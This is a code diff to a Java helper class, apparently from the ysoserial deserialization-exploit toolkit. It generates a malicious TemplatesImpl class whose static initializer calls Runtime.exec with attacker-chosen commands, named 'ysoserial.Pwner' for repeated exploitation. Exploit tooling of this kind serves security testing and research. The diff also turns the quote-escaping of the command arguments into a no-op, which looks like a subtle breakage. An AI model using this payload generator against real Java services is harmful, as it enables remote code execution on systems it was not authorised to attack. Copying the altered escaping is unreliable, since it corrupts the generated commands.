@@ -15,6 +15,7 @@ import java.io.Serializable;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+@SuppressWarnings({"unused"})
 public class TemplatesUtil {
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
@@ -61,11 +62,11 @@ public class TemplatesUtil {
             }
 
             sb.append('"');
-            sb.append(arg.replaceAll("\"", "\\\""));
+            sb.append(arg.replaceAll("\"", "\""));
             sb.append('"');
         }
 
-        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(new String[] { " + sb.toString() + " });");
+        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(new String[] { " + sb + " });");
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
